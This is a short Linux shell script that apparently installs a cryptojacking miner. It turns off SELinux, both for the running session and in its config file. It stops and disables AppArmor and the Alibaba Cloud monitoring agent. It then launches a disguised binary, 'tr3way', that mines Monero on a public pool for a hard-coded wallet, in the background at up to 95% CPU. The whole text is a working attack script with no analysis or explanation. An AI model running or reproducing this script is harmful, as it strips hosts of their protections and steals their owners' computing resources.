#!/bin/sh
PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin
#set conf
setenforce 0 2>/dev/null 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service

./tr3way -o pool.supportxmr.com:443 -u 41x15J2c2bP9Kt5zTCKX2gG2TgvtRGkUSJP2FBko9PoFD5M7cr7k4BSJZ27nHtEqsc6RNakSeSRKtXCMMskdcJJfVDuYzhj -k --tls	--cpu-max-threads-hint=95 -B